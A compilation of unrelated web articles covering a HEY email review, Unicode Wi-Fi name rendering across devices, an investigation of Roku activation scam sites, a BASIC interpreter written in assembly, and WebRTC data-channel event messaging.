<p>Frankly, I would have enjoyed an automatic sorting process, but the manual sorting works for me as well. Maybe because I’m a neat-freak but well, what works, works.</p>



<p>To make sure newsletters land on the Feed page, you need to mark the sender’s delivery options on the sender’s contact page:</p>

<p>The same can also be <a aria-label="undefined (opens in a new tab)" href="https://youtu.be/UCeYTysLyGI?t=913" target="_blank" rel="noreferrer noopener nofollow">done on the screening page</a>. I usually sort emails on my screening page. It’s easier.</p>



<p>Another source of frequent emails which I don’t need to see right now are transaction logs.</p>



<p>With HEY:</p>



<h3 id="paper-trail-has-got-me-covered">Paper trail has got me covered</h3>



<p>For me, and I’m sure for a lot of you, transaction receipts are good for referring later on.</p>



<p>I don’t need to see them on my inbox. Neither do I need to read them right now.</p>



<p>The <a href="https://app.hey.com/paper_trail" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">paper trail page</a> in HEY does precisely that.</p>

<p>Marking a sender to deliver to paper trail (the same way we marked newsletters for feed), delivers all emails from them to a separate section out of my Imbox.</p>



<p>How is this any different from what Gmail does?</p>



<p>I don’t have to mark the emails as read. They are already in a read state.</p>



<p>I usually open this page up to verify a recent transaction.</p>



<p>Talking about transaction receipts:</p>



<h3 id="hey-has-a-central-place-for-attachments">HEY has a central place for attachments</h3>



<p>How this helps is I can view all attachments from a sender and filter by file type in a single page.</p>

<p>It’s useful in situations where you don’t precisely remember the particular email an attachment was on but know the who sent it to you.</p>



<p>I have had several such moments in the past. Probably that’s why this feature is so important to me.</p>



<p>Apart from these prominent features:</p>



<h3 id="i-like-how-i-can-reply-later-or-keep-aside-my-emails">I like how I can reply later or keep aside my emails</h3>



<p>Keep aside and reply later are those tiny features which fit into my workflow without disrupting it.</p>



<p>On my regular inbox with Gmail and Spark, I used to keep emails in my inbox, which I needed to refer or maybe reply to in some time.</p>



<p>This approach ensured I didn’t miss out on stuff that I need to get back to in the near future.</p>



<p>With HEY’s keep aside and reply later functionality, the organisation became a little easier and cleaner.</p>



<p>It’s what we software engineers call “separation of concerns”.</p>

Reply later, and 2. Keep aside</figcaption></figure></div>



<p>Some use cases where these features fit in:</p>



<ul><li><strong>Reply later: </strong>This is helpful when I know I need to get back with a response to an email, but now is not the correct time. I stash the email away to reply later and then reply when I have time.</li><li><strong>Keep aside</strong>: I find this useful for cases like waiting for a settlement to process or maybe some purchase that for which I’ll get a final confirmation a few days later.</li></ul>



<p>Also, there were times where I moved an email from keep aside to reply later when I didn’t hear back from the sender in a few days.</p>



<p>In a sense, both features go hand in hand to make your email processing easier.</p>



<p>It feels good not to have to apply hacks to get something done.</p>



<p>As <a aria-label="undefined (opens in a new tab)" href="https://twitter.com/jasonfried" target="_blank" rel="noreferrer noopener nofollow">Jason Fried</a> likes to say:</p>



<figure><blockquote><p>HEY is all about workflows, not workarounds.</p></blockquote></figure>



<p>Aside from all these great features, HEY is not a total joyride. It has its share of quirks.</p>



<h2 id="there's-room-for-improvement">There’s room for improvement</h2>



<p>HEY is still at a very early stage. Therefore, it’s safe to say that there will be a lot of iterations in the future, which will make the product even better.</p>



<p>As of now, here are the things about HEY that I don’t wholly enjoy:</p>



<h3 id="the-ui">The UI</h3>



<p>When I first saw HEY, I was convinced that I’d ditch it after a few days of use.</p>



<p>I’m more of a clean and sharp design kind of guy. HEY was playful and bold.</p>



<p>I was wrong.</p>



<p>After using HEY for about two days, the UI grew on me. The boldness and fun aspect of the UI made me excited about email once again.</p>



<p>I can’t remember when I was as excited to email someone as I am right now. Email is fun again.</p>



<p>There are still some parts of the UI that I haven’t been able to accept. One of them is the dark mode.</p>

July 3, 2020 | https://hamptonmoore.com/posts/weird-wifi-names-cont/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-names-cont/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>This is a continuation of my previous post <a href="https://hamptonmoore.com/posts/weird-wifi-name-display/">Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”</a>. After posting it on HackerNews I got lots of feedback. The key one was something that I had sadly missed when I originally started this project. When the WiFi name of “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa” got shortened down to a one byte before the second “a” due to the 32 byte/octet limit of SSIDs. The issue was this character is actually two bytes wide, so the first part of the character stayed, with the second byte of it missing. The character in question was ◌̈́, with the hex codepoint cd84. Looking at the raw hex of the SSID you can see it ends in cd, <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>. For those curious about how that would be rendered on your device here it is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�”. After realizing this I decided my previous comparisons of how devices reacted to my weird unicode SSID was unfair. The SSID this time is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” which is almost the exact same but that last two byte long character was replaced with an “a”. This was to keep the SSID at 32 octets long. Looking at the new hex of the SSID <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc9161</code> you can see that is is identical baring the <code>61</code> instead of a <code>cd</code> at the end.</p> <p>Below are the previous photos of the previous SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�” with the new SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” under it. They are also grouped the same as previously to keep continuity.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/firestick.jpg" alt=""></p> <p>As before the Galaxy S8 and the Firestick both handled it perfectly with there being no issues with how it rendered besides vertical cutoff which makes sense.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/appletvgen2.jpg" alt=""></p> <p>These results were interesting. It showed that if the UTF-8 character in an SSID is invalid then IOS falls back to the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set, but since the new SSID is valid UTF-8 iOS properly renderers the SSID.</p> <p>2012 Macbook running High Sierra 10.13.6 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/macos.jpg" alt=""></p> <p>Unlike last time the Macbook actually showed the network.

Sadly the Vizio was not able to show the SSID and just fell back to escaped hex.</p> <p>The results from changing the SSID showed a couple things, namely devices really do not like it when they are given invalid or incomplete UTF-8 codes and lots of devices handle UTF-8 text much better than I thought they would. It also showed that some devices fallback to their native 8 bit encoding formats when they see an invalid UTF-8 codepoint, there is probably some room for exploitation here like inserting escape keys. I originally was not expecting the kindle to work at all, nor the chromebook after seeing the slew of question marks originally. Android was also found to be at handling text with invalid UTF-8 characters it just removed them as opposed to switching up formatting, falling back to hex, or erroring out with all question marks.</p> <p>Thank you to everyone who provided valuable feedback on the previous post. I have more research I plan ond doing with this in the future.</p> <p>Lastly if anyone would like to run this test themselves and send me the comparison results to be added my email is <code>me (at) hampton (This key &gt; not shifted) pw</code>.</p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>New Roku and other streaming device users beware. These scammers are running a large network of lookalike websites tricking into paying “activation” or “set-up” fees for something coming free of charges.</p>
<p>How do these scams work? What Roku scam websites belong to the same circle of scammers? Read on to find out.</p>

<h2 id="how-the-scam-works">How the scam works</h2>
<p>The spiel is that if someone is trying to activate a streaming device and Googles <em>“Roku activation”</em>, paid ads would pop up within the search results all leading to the scammy sites.</p>
<div><blockquote><p lang="en" dir="ltr">Top 4 results on Google (in a private window with uBlock Origin disabled) are all fake sites which lead to 800 numbers to scammers. <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/RokuSupport?ref_src=twsrc%5Etfw">@RokuSupport</a> needs to step in here and take these down. <a rel="nofollow noopener noreferrer" target="_blank" href="https://t.co/yzSoEzHfhx">pic.twitter.com/yzSoEzHfhx</a></p>— Michael | Unstable World (@esposimi) <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/esposimi/status/1262432472794574855?ref_src=twsrc%5Etfw">May 18, 2020</a></blockquote>

</div>
<p>The <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.wave3.com/2020/05/15/bbb-warns-about-roku-activation-scam/">victims are then asked to pay</a> a one-off activation fee and/or a substantial charge for tech support services not required in the first place. Needless to say, these lookalike websites are not related to Roku in any capacity. <a rel="nofollow noopener noreferrer" target="_blank" href="https://support.roku.com/article/208757068">Roku device activation</a> at <em>roku.com/link</em> and general tech support from Roku is free of charge.</p>

</div>
<p>In sum, these lookalike websites are created and pushed on Google Ads to give the victims an impression that the website is associated with Roku and a payment fee is required to get started.</p>
<h2 id="same-scam-different-shill">Same scam different shill</h2>
<p>When I started to unravel this operation, what caught my eye was a single phone number. A <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.scammer.info/d/36984-888-990-4266-roku-activation">post on Scammer.info</a> and <a rel="nofollow noopener noreferrer" target="_blank" href="https://bobrtc.tel/numbers/d/888-990-4266-tech-support-scam">BobRTC</a> confirmed that <code>+1 888 990 4266</code> appear to be associated with Roku activation scams.</p>
<p>Then, a little research revealed that <code>+1 888 990 4266</code> is associated with two suspicious sites:</p>
<ul>
<li><code>rockstreamingmedia.com</code> (more about this later); and</li>
<li><code>cliqmediastream.com</code> (from the contact us page).</li>
</ul>
<div>
<p><a href="https://osint.fans/assets/images/cliqmediastream-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="The top bar of cliqmediastream.com features +1 888 990 4266." data-alt="The top bar of cliqmediastream.com features +1 888 990 4266.">
<img src="https://osint.fans/assets/images/cliqmediastream-contact-us.png" alt="The top bar of cliqmediastream.com features +1 888 990 4266.">
</a>
<a href="https://osint.fans/assets/images/rockstreamingmedia-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="Rokku Streaming Media also features +1 888 990 4266." data-alt="Rokku Streaming Media also features +1 888 990 4266.">

</a></p><figcaption>Identical phone numbers linking cliqmediastream.com and rockstreamingmedia.com together.</figcaption>
</div>
<p>Interestingly, <code>cliqmediastream.com</code> features two phone numbers. The top bar of <code>cliqmediastream.com</code> says the contact number is <code>+1 866 920 2601</code>. A little Google research reveals that <code>+1 866 920 2601</code> is also associated with a Roku scam running at <code>streamprosetup.com</code>, a similar site offering similar streaming device support and registration services.</p>
<div>
<figure>
<a href="https://osint.fans/assets/images/cliqmediastream-website.png" data-lightbox="did-cliqmediastream-com-forget-to-change-1-866-920-2601-in-the-top-bar" data-title="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?" data-alt="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?">

</a>
<figcaption>Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?</figcaption>
</figure>
</div>
<p>The conclusion is that <code>cliqmediastream.com</code>, <code>rockstreamingmedia.com</code> and <code>streamprosetup.com</code> all belong to the same circle because of the identical phone numbers.</p>
<h3 id="going-down-the-rabbit-hole">Going down the rabbit hole</h3>
<p>Let’s dig into other details now. The company address listed on <code>streamprosetup.com</code> is <code>2810 Crossroads Drive, Suite 4011, Madison, WI-53590</code>, which is a boring office block.</p>

<p>It turns out that a large number of sites posing as Roku support also feature the same address in Madison for one reason or the other:</p>
<div><div><pre><code>ashstreamservices.com
byarvitsolutions.com
linkmediasetup.com
roku-tvactivation.com
rokutvactivation.com

<div>

</a></p><figcaption>No matter what linking code is entered, the activation process always fails.</figcaption>
</div>
<p>The similarities do not stop here. I found a handful of other websites having similarities with each other. For example, the Privacy Policy, the (fake) service description and/or other textual blurbs are identical on these sites indicating that these sites belong to the same circle.</p>

<p>It is always exciting to have a new gadget at home. However, one should exercise great care when it comes to the initial setup and activation of the device. Scammers are setting up fake tech support sites and gaming the Google search results to get your money.</p>
<p>To avoid being scammed, always follow the on-screen instructions of your streaming device and never take shortcuts by doing a Google search for the setup page. If you are stuck, call the official tech support number of Roku or your streaming device brand.</p>
<p>What happens when a victim calls up one these support numbers? Here is an amusing video from Kitboga about his experience with a fake Roku tech support scam:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s funny the rabbit holes one ends up. One of my personal projects for several years has been the creation (exploration, really) of a “fake emulator” — that is, an emulator for a computer that never existed all written in JavaScript. Instead, the machine would pay homage to the eight and sixteen bit machines of the 1980s and ‘90s.</p>
<p>I like to do things the hard way, though: this machine would also be based on a novel instruction set as well. The instruction set would be similar to that of the era, but also be a little easier to use. And so, <a href="https://github.com/kerrishotts/retroputer" rel="noopener nofollow noreferrer">Retroputer</a> was born. Over several years, the implementation has been built out and improved, although it’ll probably never be “complete” (it’s a personal exploration, after all).</p>
<p>Then @bbcmicrobot became a thing, and I wanted to be able to do a similar thing for Retroputer. My JS development skills are mostly in the arena of the front-end, and so this would be a cool way to get some more back-end skills. One problem: Retroputer could only understand its own assembly language. It had no BASIC support yet.</p>
<p>And so here I am, building a BASIC interpreter, ‘80s style — that is, entirely in assembly language, just like it used to be done. And I thought I’d share that journey, since it’s not often we delve into areas so far from our typical abstractions. My daily driver (JavaScript) makes a lot of things trivial and sometimes those things feel magical. Understanding the lowest levels of the process can often help with understanding those abstractions.</p>
<p>And so… let’s begin.</p>
<h2 id="parsing-in-low-level-assembly-language">Parsing in Low-Level Assembly Language</h2>
<p>When I wrote the assembler for Retroputer, I was able to use a really nice tool called Pegjs. This made quick work of the assembler’s custom syntax, but was unfortunately there’s nothing like it for Retroputer ASM.</p>
<p>Which means we have to do it the hard way.</p>
<p>Parsing actually occurs in multiple phases. A language that uses a compiler parses the code into an abstract syntax tree (or similar concept), and can then use that tree to generate the resulting native code. A consequence of this is that the program must be syntactically correct in order for the compilation to be successful.</p>
<p>Some interpreters today also have this concept because it’s often useful to generate the intermediate AST and execute from there than it is to execute from the original source.</p>
<p>But for a BASIC interpreter in a machine with limited resources, the most resource-effective way to parse is to do it in multiple phases — some of which occurs at run time. This means, however, that syntax errors often can’t be detected until the program is run and the area of code with the error is encountered.</p>
<p>The three phases of Retroputer BASIC parsing are as follows:</p>
<ol>
<li>Line Transformation</li>
<li>Tokenization</li>
<li>Runtime Syntax Checking</li>
</ol>
<p>The first two steps occur as the user enters a program (or loads one). The last one occurs while the program is running. Essentially, the first two build out the rough scaffolding of an airplane, but with no guarantee of flight. The last step is essentially acting as a test pilot — hoping you’ll get off the ground, but not knowing until you try.</p>
<p>Thankfully Retroputer BASIC doesn’t come with such dire consequences for raising an error during runtime.</p>
<p><em><strong>Note:</strong></em> Source code (in progress) for Retroputer BASIC is <a href="https://github.com/kerrishotts/retroputer/tree/master/asm/kernel/basic" rel="noopener nofollow noreferrer">available on GitHub</a>.</p>
<h2 id="line-transformation">Line Transformation</h2>
<p>This is the easiest part of the entire process. Essentially, the line that the user enters is converted to uppercase so that later processes are easier (and faster). BASIC is not sensitive to case, and so we can use that to our advantage.</p>
<pre><code>print 2+2
' becomes:
PRINT 2+2
</code></pre>
<p>Doing this in JavaScript is easy, right?</p>
<pre><code>theLine = theLine.toUpperCase();
</code></pre>
<p>But in assembly language, we have to be more detailed about how things get done. We need to read in a character, convert it to uppercase, and then store it somewhere.</p>
<pre><code>           ld  y,  0                # y is our index
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 97               # is al (char) in range?
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>The above doesn’t quite match the same semantics as the JavaScript version. One important difference is that we now use Unicode to work with text, and so converting input from lowercase to uppercase can often be more difficult — and maybe impossible (depending on the language). Retroputer lives in the world of ASCII (rather, it’s own variation, named RetSCII), meaning that all supported characters are encoded into eight bits. This is woefully inadequate for many languages, but also true to the period.</p>
<p>It also means that we can use a nice feature of ASCII to convert from lowercase to uppercase. It turns out that uppercase “A” is represented with <code>65</code> in ASCII, and lowercase “a” is represented with <code>97</code>. If you’re familiar with your powers-of-two, that difference should catch your eye.</p>
<p>So it turns out that lowercase letters are represented with a number that’s exactly 32 above the uppercase letter. Once we know something’s in range, all we need to do is subtract 32!</p>
<p>That works, but we could just do some bit twiddling. For Retroputer this wouldn’t actually be any faster than subtraction, but avoiding subtraction means we don’t have to worry about the carry/borrow flag during arithmetic. It turns out we can use a bitwise <code>and</code> to turn off the bit for the 32 place value instead.</p>
<pre><code>and al, 0b1101_1111         # turn off bit in 32-place
# versus
clr c                       # clear carry
sub al, 32                  # subtract 32
</code></pre>
<p>But there’s a catch: not <em>everything</em> can be converted to uppercase. If the user has included a string literal, for example, we have to be more careful. After all, we don’t want Retroputer BASIC to scream at the user all the time, right? (Although many computers of the era didn’t have lowercase capability, Retroputer doesn’t share that same limitation.)</p>
<p>For example:</p>
<pre><code>print "Hello, World!"
' should become:
PRINT "Hello, World!"
' and not
PRINT "HELLO, WORLD!"
</code></pre>
<p>This means we need to keep track of whether or not we’re in the middle of a string literal. In BASIC, there’s only one signifier for this: the double quote. If we check if a character is a double quote, we can set a flag, and depending on the flag’s value, we can perform an uppercase operation or leave things alone.</p>
<p>It turns out that in JavaScript there’s no built-in to accomplish this, but we can build one:</p>
<pre><code>const len = theLine.length;
let insideString = false;
for (let i = 0; i &lt; len; i++) {
    const ch = theLine[i];
    if (ch === `"`) insideString = !insideString;
    if (!insideString) {
        const newCh = ch.toUpperCase();
        if (ch !== newCh) theLine[i] = newCh;
    }
}
</code></pre>
<p>Now the logic of the JS more closely matches that of the assembly version, although we’re taking advantage of JS’s unicode support a bit more.</p>
<p>The assembly version looks like this:</p>
<pre><code>           ld  y,  0                # y is our index
           ld  bl, 0                # === insideString (false)
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 34               # is al a double quote?
           brs !z  check_char       # no? should we uppercase it?
           xor bl, 0xFF             # yes? toggle insideString
_check_char:
           cmp bl, 0xFF             # inside a string?
           brs z   _continue        # yes? don't modify it
           cmp al, 97               # is al (char) in range? "a"
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion           "z"
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>So far all we’ve done is transform the input text to uppercase, but there’s one extra benefit here in the way we’ve had to track if we’re inside a string. We can do one round of syntax checking here!</p>
<p>If, at the end of the process we find that <code>inString</code> is still true (<code>bl = 0xFF</code>), we can trigger an error, because it means that there’s an unterminated string literal somewhere in the line.</p>
<p><em><strong>Side note:</strong></em> It turns out many BASICs are quite lenient when it comes to terminating quotes for strings. One of many things I learned while building my own interpreter. Even so, it doesn’t feel right to me, and so Retroputer BASIC doesn’t permit it.</p>
<h2 id="tokenization">Tokenization</h2>
<p>The next phase of parsing involves converting an entered line into something more efficient for Retroputer BASIC to execute. This is as close to the concept of an abstract syntax tree that we’ll get here — the result will definitely not be a tree. But it will be something that we can quickly evaluate during runtime.</p>
<p>One common feature of early microcomputers was a very limited memory capacity. Retroputer has more memory than most machines of the time had by default, but it still has much less than modern machines. As such, long BASIC programs could easily consume far too much memory if they were stored as the user typed them.</p>
<p>To save space, keywords are <em>tokenized</em> as the program is entered into memory. This process converts keywords into single-byte tokens. Keywords are always at least two bytes long, and so this savings can add up. It also means that we can use a lookup table during execution to call the appropriate assembly language routines.</p>
<p>Retroputer BASIC goes a little further than most BASICs of the time, …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>With the release of version 2.0, Ant Media Server Enterprise Edition supports WebRTC Data Channel standard and previously we posted 3 blog posts related to setup, usage and implementation of Data Channels with Ant Media Server EE:</p>
<ul>
<li><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/">How to Exchange Data Easily Using WebRTC Data Channels with Ant Media Server</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 1</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer-2/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 2</a></li>
</ul>
<p><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/"></a>Our last blog post on this topic will be about sending control messages like actions and events through WebRTC Data Channels and about best practices when creating more interactive and complex applications through usage of these. We will examine 2 use case scenarios with some example usages from our Javascript and Android SDKs and try to make them more understandable for our customers.</p>
<p>Sending all kind of events or actions through data channels is the most convenient and secure way to implement interactive applications with WebRTC. Low latency and secure communication through Data Channels can be useful especially in case of interactive applications like in conferences, in e-learning or in some games where each participant has a certain role and allowed to do certain types of actions and can trigger certain events.</p>
<p><img src="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif" alt="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1" width="423" height="238" srcset="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif 300w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-1024x576.gif 1024w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-768x432.gif 768w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-600x338.gif 600w" sizes="(max-width: 423px) 100vw, 423px" title="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1"></p>
<p>For example in an e-learning application, a student can raise hand to ask a question and the teacher can decide to accept this request or reject it. If the request is accepted, the teacher and the other students will start playing the video stream of that student.</p>
<p>A similar scenario can also be realized for video conference applications of companies where the manager can allow employees to speak if requested during a presentation. Similarly voting on a subject during conferences or e-learning, communicating certain events like muted microphones, alerting or poking other users or sending game commands and events during WebRTC games can all be easily implemented through Data Channels.</p>
<h2>Message Format and Protocol</h2>
<p>As mentioned in <a href="https://antmedia.io/webrtc-chat-and-file-transfer/">our blog related to chat application</a>, we recommend sending events or user actions as structured data in JSON or XML. For most of the applications parsing them with common JSON or XML parsers in the receiver side would be enough but for complex applications having a validation schema like XML Schema or JSON Schema for these events can be useful and less error prone when validating, parsing, mapping them.</p>
<p>An example event in JSON format which are sent through data channel to all conference participants in our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><em>conference.html</em> </a>&nbsp;page when someone mutes his microphone looks like this:</p>
<pre><span>{
"streamId": "stream1",
"eventType": "MIC_MUTED"
}</span></pre>
<p>For more complex applications some kind of communication protocol is needed to manage the possible interactions between different users or the system. When designing such protocols for interactive and reactive applications, it is very important to clearly specify and examine what actions and events a user with a certain role can generate and which other states these events can lead to. In such cases, UML Sequence diagrams can be helpful to document and design the communication scenarios and UML State diagrams can help to handle all edge and use cases which are dependent on different states and roles. Next we will talk about a simple use case related conferences.</p>
<h3>Use Case: WebRTC Video Conference Events</h3>
<p>In latest version of our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><span><em>conference.html</em> </span></a>and <span><em>ConferenceActivity</em></span> in our WebRTC Android SDK, when a conference attendee mutes or unmutes his microphone or enables or disables his video stream for publishing, <a href="#Message_Format_and_Protocol">a special event message like in section above</a> is sent to the all the other conference participants, through WebRTC Data Channel. Then all other stream participants parse the received event and based on the event type the developer can customize the <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank">conference.html</a> to notify the users or show an icon on the corresponding streams.</p>
<p>In Web side when the event receives the <span>“data_received”</span> signal in callback function is called:</p>
<pre><span>... else if(info == "data_received") { handleNotificationEvent(obj); }</span></pre>
<p>which then handles different notification events based on the event type:</p>
<pre><span>function handleNotificationEvent(obj) {</span>
<span>&nbsp; &nbsp; console.log("Received data : ", obj.event.data);</span>
<span>&nbsp; &nbsp; var notificationEvent = JSON.parse(obj.event.data);</span>
<span>&nbsp; &nbsp; if(notificationEvent != null &amp;&amp; typeof(notificationEvent) == "object") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventStreamId = notificationEvent.streamId;</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventTyp = notificationEvent.eventType;</span>

<span>&nbsp; &nbsp; &nbsp; &nbsp; if(eventTyp == "CAM_TURNED_OFF") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned off for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; } else if (eventTyp == "CAM_TURNED_ON") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned on for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} else if (eventTyp == "MIC_MUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone muted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} </span><span>else if (eventTyp == "MIC_UNMUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone unmuted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;}</span>
<span>&nbsp; &nbsp;}</span>
<span>}</span></pre>
<p>In this case for simplicity, it only logs them to the console. In Android in the <em><span>ConferenceActivity</span> <span>onMessage</span></em> method the notification events are handled analogously with Toast messages:</p>
<pre><span>public void onMessage(DataChannel.Buffer buffer, String dataChannelLabel) {</span>
<span>&nbsp; &nbsp; ByteBuffer data = buffer.data;</span>
<span>&nbsp; &nbsp; String strDataJson = new String(data.array(), StandardCharsets.UTF_8);</span>

<span>&nbsp; &nbsp; try {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;JSONObject json = new JSONObject(strDataJson);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String eventType = json.getString("eventType");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String streamId = json.getString("streamId");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Toast.makeText(this, eventType + " : " + streamId, Toast.LENGTH_LONG).show();</span>
<span>&nbsp; &nbsp; } catch (Exception e) {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Log.e(getClass().getSimpleName(), e.getMessage());</span>
<span>&nbsp; &nbsp; }</span>
<span>}</span></pre>

<h3>Use Case: Raising Hand in E-Learning</h3>
<p>A more complex case would be a student raising hand to ask a question in an E-learning application.</p>
<p>In our <span>hypothetical </span>scenario, multiple students can send raise hand messages approximately in the same time through WebRTC Data Channel and after that the teacher should decide to accept one of their requests or reject their requests. So the answer of the teacher should reference the unique stream id of the sender of the <span>RaiseHandRequest</span> which he accepted or rejected. If he accepts a request he will send accept message to everybody and the student whose request is accepted will automatically start publishing his video stream and the others will play it.</p>

We can add also following constraint to our scenario; while a student is asking a question, no other student can request to ask any questions. To implement this constraint the state information can be stored in each participants with following possible states:</p>
<ol>
<li>Teaching</li>
<li>Question_Session_Empty</li>
<li>Question_Session_Full</li>
</ol>
<p>So the students can only ask questions when state is <span>Question_Session_Empty</span> and when state is <span>Question_Session_Full,</span>&nbsp;nobody can raise hand to ask questions. In our scenario the coordinator of the state will be the teacher and in edge case where a student is temporarily disconnected and reconnects, the current state should be sent to him by the teacher. (Another option is teacher sending the state regularly as some kind of keep alive message.)</p>
<p>In this scenario an example <span>RaiseHandRequest</span> request in JSON format would look like this:</p>
<pre><span>{</span>
<span>"senderId":"student1",</span>
<span>"eventType":"RaiseHandRequest",</span>
<span>"eventTime": 1592602900,</span>
<span>"description":"Question Related to Lesson 1"</span>
<span>}</span></pre>
<p>And a positive answer to his request from the teacher would look like this:</p>
<pre><span>{</span>
<span>"senderId":"teacher1",</span>
<span>"eventType":"RaiseHandAccept",</span>
<span>"eventTime": 1592602986,</span>
<span>"answerToRequest": "student1",</span>
<span>"description":"You have only 1 minute to ask"</span>
<span>}
</span></pre>
<p>After receiving this, the <span>student1</span> would start publishing his video stream and the others would start playing it.</p>

